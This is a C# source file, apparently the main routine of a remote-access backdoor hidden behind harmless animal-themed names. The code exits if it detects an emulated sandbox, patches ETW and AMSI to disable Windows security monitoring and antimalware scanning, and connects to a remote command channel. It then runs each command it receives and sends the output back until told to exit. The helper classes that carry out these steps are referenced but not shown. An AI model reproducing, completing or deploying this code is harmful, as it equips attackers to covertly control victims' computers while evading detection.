using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;



namespace AnimalZoo {
    public class Elephant
    {
        
        static void Main(string[] args)
        {
            Console.WriteLine("__");
            System.Diagnostics.Debug.WriteLine("___");

            if (Chameleon.CheckEmulated())
                return;

            Chameleon.PatchETW();
            Chameleon.PatchAMSI();

            Console.WriteLine("Welcome to 4nimal Zoo!");

            Owl owlChannel = new Owl(true);
            if(!owlChannel.Connect())
            {
                return;
            }

            string lastOwlCmmd = "";
            do
            {
                string owlCmmd = owlChannel.receiveCommand();
                if(owlCmmd == null)
                {
                    break;
                }
                lastOwlCmmd = owlCmmd.Trim();

                string output = Shark.exec(owlCmmd);
                if(output == null)
                {
                    break;
                }
                if (!owlChannel.respondWith(output))
                {
                    break;
                }
            } while (lastOwlCmmd != "exit");

        }
    }
}
